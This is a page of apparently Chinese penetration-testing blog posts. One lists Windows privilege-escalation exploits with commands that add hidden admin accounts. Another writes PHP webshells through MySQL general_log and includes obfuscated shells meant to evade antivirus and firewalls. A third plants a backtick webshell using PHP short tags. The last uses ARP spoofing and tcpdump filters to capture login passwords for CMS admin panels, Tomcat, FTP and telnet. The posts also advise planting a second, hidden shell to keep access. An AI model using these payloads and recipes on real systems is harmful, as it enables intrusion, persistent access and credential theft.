<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Windows内核模式驱动CVE-<span class="number">2015</span>-<span class="number">1680</span>信息泄露漏洞</div><div class="line">漏洞代号: MS15-<span class="number">051</span></div><div class="line">补丁编号: KB3045171</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 08 以后的系统基本都可以,成功率较高,菜刀直接可用</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms 15 051.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ATM 字体驱动程序中的漏洞可能允许特权提升</div><div class="line">漏洞代号: MS15-<span class="number">077</span></div><div class="line">补丁编号: KB3077657</div><div class="line">exp 用途: 字体提权</div><div class="line">适应平台: 可能该exp <span class="number">32</span>位系统好使,<span class="number">64</span>位均未成功</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms 15 077.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Windows某些版本内核模式驱动程序win32k.sys的进程初始化实现中存在安全漏洞</div><div class="line">漏洞代号: MS15-097</div><div class="line">补丁编号: KB3079904</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 可能是exp自身的问题,测试均未成功,缺少库</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">微软Media播放器命令执行漏洞</div><div class="line">漏洞代号: MS15-<span class="number">100</span></div><div class="line">补丁编号: KB3087918</div><div class="line">exp 用途: 适合钓鱼,msf中已有此exp</div><div class="line">适应平台: </div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">漏洞代号: MS16-<span class="number">014</span></div><div class="line">补丁编号: KB3134228</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 实际测试只在<span class="number">2008</span>(<span class="number">64</span>)的系统上成功,其它系统直接蓝屏</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms16 014.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wedav漏洞</div><div class="line">漏洞代号: MS16-<span class="number">016</span></div><div class="line">补丁编号: KB3143141</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 本地win7(<span class="number">32</span>)并未成功</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">漏洞代号: MS16-<span class="number">032</span></div><div class="line">补丁编号: KB312428<span class="number">0</span></div><div class="line">exp 用途: powershell本地提权</div><div class="line">适应平台: 08 r2以后的系统成功率较高,可能是powershell自身版本的问题,有exe版的,大家自己去找吧</div><div class="line">用法:</div><div class="line"><span class="comment"># powershell -nop -exec bypass -c "&amp; &#123;Import-Module 'c:\Invoke-MS16-032.ps1';Invoke-MS16-032 -Application cmd.exe -commandline '/c net user HELPS$ amin!@#45 /add'&#125;"</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms16 032 _1.jpg" alt=""><br><br><img src="/img/ms16 032 _2.jpg" alt=""><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">漏洞代号: MS16-<span class="number">135</span></div><div class="line">补丁编号: KB314178<span class="number">0</span></div><div class="line">exp 用途: 利用.NET提权</div><div class="line">适应平台: 08 R2本地测试成功,exp写的还不错</div><div class="line">用法: 先执行 ASLRSideChannelAttack.exe,再执行 SetWindowLongPtr_Exploit.exe 接上上面跑出来的地址</div><div class="line"><span class="comment"># powershell -nop -exec bypass -c "&amp; &#123;Import-Module 'c:\Invoke-MS16-135.ps1';Invoke-MS16-135 -Application cmd.exe -commandline '/c net user HELPS amin!@#45 /add'&#125;"</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ms16-135.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">smb远程执行</div><div class="line">漏洞代号: MS17-<span class="number">010</span></div><div class="line">补丁编号: KB4013389</div><div class="line">exp 用途: 远程注入dll</div><div class="line">适应平台: </div><div class="line">用法: 这也可能是nsa工具包里最好用的一个,想必大家早都已经很熟练了,这里就不啰嗦了</div></pre></td></tr></table></figure>
<p><br><br>快速检测,注意,这里一定要进到一个能读写的目录中去执行,要不然,没法创建临时文件:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># systeminfo&gt;temp.txt&amp;(for %i in (KB952004 KB970483 KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3011780 KB3036220 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3124280 KB3141780 KB4013389) do <span class="doctag">@type</span> temp.txt|<span class="doctag">@find</span> /i  "%i"|| <span class="doctag">@echo</span> %i Not Installed!)&amp;del /f /q /a temp.txt</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/systeminfo_pacet.png" alt=""><br><br><br></p>
<h5 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;时间仓促,没有写完,后续会补上,其实,溢出提权,表面来讲没什么太多好说的,嘿嘿……原谅我不会逆向,所以说不出来,实际提的过程中,最大的困难可能还是在免杀和调exp上,不同的系统exp在执行时经常会出现各种各样的问题,尤其是在64位机器上……如果这两点能搞定,拿着别人的exp,用用还是蛮轻松的,比如ms17-010……是吧,大家都懂的,嘿嘿,不好意思又跑题了<br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/03/24/mysql-log-write-webshell/">
                利用mysql的general log 写shell[突破into outfile]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-03-24</span>
            
            
            
                <span class="category">
                    <a href="/categories/webshell/">webshell</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;在实际渗透过程中,我们有时可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却写不进去,可以肯定的是,我们对所指定的目标网站目录是绝对有写权限的且mysql的root用户并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你<br><br><br><img src="/img/show variables waf.png" alt=""><br></p>
<p>利用mysql日志文件来拿shell,原理其实非常简单,当我们开启general_log以后,每执行一条sql都会被自动记录到这个日志文件中,我们就可以通过这种方式把我们的shell也自动写进去,运维可能平时都是拿这个查慢查询,会临时开启下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like '%general%';   查看当前配置,'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log' 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来</div><div class="line">mysql&gt; set global general_log = on;  	  默认是关闭的,不然记录亮是非常大的</div></pre></td></tr></table></figure></p>
<p><img src="/img/show variables config.png" alt=""><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; set global general_log_file = <span class="string">'C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/abouts.php'</span>; </div><div class="line">mysql&gt; select <span class="string">'&lt;?php eval($_POST[request]);?&gt;'</span>;    开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell</div></pre></td></tr></table></figure></p>
<p><img src="/img/show variables write shell.png" alt=""><br><br><img src="/img/show variables log exec.png" alt=""><br><br><img src="/img/show variables res.png" alt=""><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select <span class="string">"&lt;?php $sl = create_function('', @$_REQUEST['klion']);$sl();?&gt;"</span>;    免杀shell,eval方式</div><div class="line">mysql&gt; SELECT <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['klion']));?&gt;"</span>;     别人的免杀shell,assert&amp;base64encode方式</div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; set global general_log_file = <span class="string">'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log'</span>;    最后,记得把配置恢复原状就好了,拿到shell以后,记得马上再传一个shell[放的隐蔽点],然后再通过新的shell把现在这个shell删掉,谨慎一点,起码不会让你的shell掉的那么快</div><div class="line">mysql&gt; set global general_log = off;</div></pre></td></tr></table></figure>
<p><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/02/20/short-open-tag/">
                利用php短格式bypasswaf查杀
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-02-20</span>
            
            
            
                <span class="category">
                    <a href="/categories/webshell/">webshell</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="利用php短格式简单bypasswaf查杀"><a href="#利用php短格式简单bypasswaf查杀" class="headerlink" title="利用php短格式简单bypasswaf查杀:"></a>利用php短格式简单bypasswaf查杀:</h5><p>需要php开启短格式支持,到php.ini中去开启一下,然后重启web服务即可<br>[当然啦,它默认是不开的,生产环境中也很少会有运维去开,直接利用可能不太行,但用来隐藏webshell或者bypass waf还是值得尝试的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">short_open_tag = On</div></pre></td></tr></table></figure></p>
<p><img src="/img/short_open_tag .png" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=<span class="string">`$_GET[m]`</span>;   在php中反引号可直接用来执行系统命令,跟shell的反引号作用类似</div></pre></td></tr></table></figure>
<p><img src="/img/short_open_tag shel .png" alt=""><br><img src="/img/short_open_tag waf .png" alt=""></p>
<p>然后访问webshell,执行系统命令即可,直接右键看源代码格式可能会稍微工整一些<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">view-<span class="symbol">source:</span><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wordpress</span>-<span class="number">4.2</span>/shrot.php?m=net user</div></pre></td></tr></table></figure></p>
<p><img src="/img/short_open_tag res .png" alt=""><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/01/31/tcpdump-sniffer-pass/">
                linux下的嗅探实践 [tcpdump篇]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-01-31</span>
            
            
            
                <span class="category">
                    <a href="/categories/sniffer/">sniffer</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>单单对于渗透而言,我们可以拿 tcpdump 干些什么:<br>&nbsp;&nbsp;&nbsp;&nbsp;从工具命名不难看出,所谓 tcpdump 的意思,其实就是把 tcp 的数据[当然啦,它并非仅仅支持tcp/ip协议族] dump下来,我想作者应该也是这个意思,在常规生产环境中,运维或者协议分析师可能主要用它来捕捉一些敏感的流量行为(通过不同的数据特征来辨别出哪些流量可能带有入侵或者攻击行为),排查诊断各种网络故障,或者专门针对某个工具进行逆向(流量)分析等等……,就tcpdump本身来讲,它能做的事情非常多,真要仔细讲,可能会像wireshark那样,又得出本书,工具虽然小巧,但用途良多,下面就我们单单就实际渗透过程中的一些用法做些简单科普,主要还是用它来抓抓明文密码[当然,它本身的强大绝非仅限于此,个人能力有限,也没一下子涉及那么多,今天只单单说一个点(可能连个点都算不上吧,基本是没有任何技术含量的)]<br><br><br>以centos 6.x中的具体编译安装为例[在其它的发行版中安装方法基本类似],都非常简单,但考虑到文章的完整性想想还是一并说了算了(主要是想让大家能快速上手),工具是开源的(基于c,安装自然需要c编译器[gcc]),请自行到官方站点下载其源码包:<br><a href="http://www.tcpdump.org/" target="_blank" rel="external">http://www.tcpdump.org/</a> </p>
<p><br><br>编译安装前的一些必要准备::<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">先检查下当前系统有没有安装tcpdump,如果有,就先将其卸载</div><div class="line"><span class="comment"># rpm -qa | grep tcpdump</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">很显然,我这里系统自带的有tcpdump 是<span class="number">4.0</span>版本,确实有点儿老了[其实,新旧不太重要,关键是稳定能用就好],现在就把它卸载掉,咱们来重新编译安装最新版的<span class="number">4.9</span></div><div class="line"><span class="comment"># rpm -e tcpdump</span></div><div class="line"><span class="comment"># rpm -qa | grep tcpdump</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">首先,装好libpcap库,因为tcpdump依赖libpcap进行抓包[其实不仅仅tcpdump依赖它,很多linux下的抓包工具都依赖它,可能是直接用里面封装好的函数比较方便吧],所以在编译tcpdump之前,务必要把libpcap这个库装好,很简单,如下:</div><div class="line"><span class="comment"># cd libpcap-1.8.1</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install    检测依赖环境,生成makefile文件,编译</span></div><div class="line">可以看到,编译安装过程还是比较顺利的,如果目标环境不是特别恶劣,一般安装过程也不会有什么问题</div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">接着就来编译安装tcpdump,和libpcap编译安装过程并没什么不同,如下:</div><div class="line"><span class="comment"># cd tcpdump-4.9.0</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line">可以看到,编译安装也一切正常</div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">装好完以后,先稍微测下,看看工具运行是否正常,可以看到,现在tcpdump的版本是<span class="number">4.9</span>,而非之前的<span class="number">4.0</span>,libpcap的版本是<span class="number">1.8</span>.<span class="number">1</span></div><div class="line"><span class="comment"># tcpdump -h</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">执行下面的命令,如果看到有数据流动,就表示tcpdump已经基本可用</div><div class="line"><span class="comment"># ping www.google.com </span></div><div class="line"><span class="comment"># tcpdump -i eth0[你自己的网卡接口] -c 12    新开一个终端监听</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">注意,如果编译过程中有什么错误,仔细看看提示的是什么东西,相信绝大部分原因可能就是目标的系统中没有装gcc(c编译器),gcc-c++,可以把gcc*先装上,之后再回来接着重新编译(记得在重新编译之前先执行下make clean)</div><div class="line"><span class="comment"># yum install gcc -y   </span></div><div class="line"><span class="comment"># yum install gcc-c++ -y   这是redhat系列发行版的名称,ubuntu系列中可能不是这个名字</span></div></pre></td></tr></table></figure>
<p><br></p>
<p>tcpdump [类似wireshark的命令行版本,虽然没wireshark那么简单易用,但对于一个命令行工具来讲,说心里话,它已经做的足够好了,蛮佩服作者的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">几个常用选项(选项确实比较多,我只挑了几个相对比较常用的,更多更具体的选项用法,请直接自行man tcpdump进行参考):</div><div class="line">-D   显示当前系统中所有可用的网卡接口</div><div class="line">-i   指定用于嗅探的网卡接口</div><div class="line">-c   后面跟上要抓包的个数[要抓几个包]</div><div class="line">-s   指定抓取的数据包长度,设置为<span class="number">0</span>时,表示让tcpdump自行选择合适的长度进行抓取,务必加上,不然可能会抓不全</div><div class="line">-A   以ASCII码的形式显示每个数据包,分析http类数据非常好用</div><div class="line">-vvv 显示最详细的输出</div><div class="line">-w   将数据包直接写到文件中而不直接输出,这种有利于我们后续可以直接包丢到wireshark中去人工分析</div><div class="line">-U   将数据包的写入和保存同步,不用非等到缓冲区已满时才写入文件,通常配合 -w 一起使用</div><div class="line">-r   可以把之前用 -w 写入的数据包文件,再用 -r 选项进行读取</div><div class="line">-xx / -XX  以<span class="number">16</span>进制显示数据包,分析学习各种协议时非常直观</div><div class="line">-q   让输出的格式更为精简,有点儿类似安静模式</div><div class="line">-nn  不解析端口和主机名,其实就是不把端口解析成服务名,比如<span class="number">21</span> =&gt; ftp</div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">常用几个过滤器关键字:</div><div class="line">host,port    指定ip和端口</div><div class="line">src,dst 指定数据流向,目的和源[可以是主机,端口]</div><div class="line">net 指定网段</div><div class="line"></div><div class="line">常用的几个过滤器运算符:</div><div class="line"><span class="keyword">and</span>(且) ,<span class="keyword">or</span>(或者),!(非)</div></pre></td></tr></table></figure>
<p><br></p>
<p>好了,在我们对tcpdump有了基本的了解之后,就可以开始尝试抓取各类明文密码数据了,想必大家都已经很清楚,在实际的渗透过程中,密码对我们来说意味着什么,还是那句话,这里只是单单针对实际渗透过程中的一些用法做些简要说明,更多的用法,大家请自行琢磨:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">测试环境,如下[已经全部桥接]:</div><div class="line">被嗅探的机器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.196</span> (win7cn) <span class="number">192.168</span>.<span class="number">3.251</span>(这台机器上有opencart程序,和navcait工具,等会儿要用)</div><div class="line">嗅探者的机器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.6</span> (kali)</div><div class="line">配置好了各种服务的服务器机器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.23</span> (win2008 r2)</div><div class="line">邮件服务器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.30</span></div><div class="line">务必记得开启本机的路由转发,不然目标机器就上不了网了</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">先做好arp毒化,因为别人机器上的流量是不会无故流过你的机器的,所以,你务必要主动让别人的流量经过你,这样你才能抓到密码,这里就用dsniff套件中的arpspoof来毒化一下目标机器:</div><div class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.3.196 192.168.3.1</span></div><div class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.3.251 192.168.3.1</span></div><div class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.3.1 192.168.3.6</span></div></pre></td></tr></table></figure>
<p><img src="/img/arpspoof tcpdump.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">抓取指定机器上的各类 http 数据[主要是针对各类web后台登录的账户密码](默认的web端口是<span class="number">80</span>,但你也可以换成一些非常常规的web端口,比如,<span class="number">8080</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">8081</span>……不过前提是你要确定这些端口跑的确实是web服务)<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 discuz 的管理员账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)'</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump discuz.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 joomla 的后台管理的账号密码[这里的账号密码字段去看下登录的那个表单里面就知道了]</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'password=|username=' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump joomla.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 wordprss 的后台账号密码,注意这里的表单字段要稍微改下,后面过滤字段的方式都是一样的,自己去看下就好了</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'log=|pwd=' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump wordpress.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 drupal 的后台账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'name=|pass=' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump drupal.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 opencart 的后台账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i --color=auto "username|password" -A 5</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump opencart.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 phpmyadmin 的数据库账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'pma_username|pma_password' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump phpmyadmin.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取华为家用路由的登录密码(目测是sha[有点儿像<span class="number">256</span>]系列的hash,总算碰到了一个加完密再传的 (: )</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'password' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump huawei route.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓 tomcat 的 manager的登录账号密码,密码时base64编码的,解码下就好了</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 8080 and host 192.168.3.196' | egrep -i 'Authorization' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump tomcat.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">除了上面提到的这些,其实,还有针对各种java控制台[大多数默认都在<span class="number">8080</span>端口上]的登录账号密码都是可以尝试的,这里就不一一演示了,手法基本都类似[只要不是基于ssl的,你都可以随便尝试],关于,如何抓取各种http密码数据暂时就先说到这里了,列举的都是一些极为简单粗暴的用法,大家可以根据自己的实际需求任意发挥[最终目的还是能抓到自己想要的东西],不过需要注意的是,有些目标内部的web服务并非都工作在默认的<span class="number">80</span>或者<span class="number">8080</span>端口上,也可能会跑在<span class="number">81</span>,<span class="number">82</span>,<span class="number">8081</span>……,这样的端口上,在实际渗透过程中,大家要多尝试,对目标的一些敏感信息要有敏锐的观察力[无意中可以激发自己的渗透灵感],根据这种方式,大家不妨尝试自行抓取分析各类常用软件中的一些http数据,至于怎么抓gmail,<span class="number">126</span>,outlook这类的基于tls/ssl账号密码[我们后面会再单独说明],以及其它你能想到的所有的可能会有账号密码的地方都可以随便尝试</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">抓取指定机器的 ftp 明文账号密码(默认端口<span class="symbol">:</span><span class="number">21</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -nn  -s 0 host 192.168.3.196 and tcp dst port 21</span></div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -U host 192.168.3.196 and tcp dst port 21 -w ftp_pass.pcap  直接把包写到文件中,留存后续分析</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump ftp.jpg" alt="&quot;bypasscdn&quot;"><br><br><img src="/img/tcpdump ftp res wireshark.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 telnet 的登录账号密码,抓路由也许用得到[不过现在貌似大多数都换成ssl了(ssh)](默认端口<span class="symbol">:</span><span class="number">23</span>):</div><div class="line"><span class="comment"># tcpdump -vv -i eth0 -nn -s 0 host 192.168.3.196 and dst port 23 -w telnet_pass.pcap</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump telnet res.jpg" alt="&quot;bypasscdn&quot;"><br><br><img src="/img/tcpdump telnet.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">抓取网络中的sql语句,运气好的话兴趣还能抓到数据库的用户账号密码,当然,你可以通过自己写ettercap脚本对这些语句做一进一步的中间人利用[增删改查],比如权限够的情况下,可以尝试添加数据库用户,添加网站用户,等等……,因为sql都是明文传输,所以如果利用好了危害还是非常大的,不过这并不是今天的重点,我们今天还是想要简要说明下tcpdump在实战中的一些基本用途,至于那些中间人用户,抽空会再详细说明,不过实战中利用起来还是比较困难的,除非你自己的机器直接就正常的处在目标内网[比如,vpn内网,无线……]中,如果是这样,利用起来还是蛮舒服的</div><div class="line">抓取 mysql 的增删改查sql(默认端口<span class="number">3306</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -XX  dst port 3306 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump mysql.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 mssql 的增删改查sql(默认端口<span class="number">1433</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  dst port 1433 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
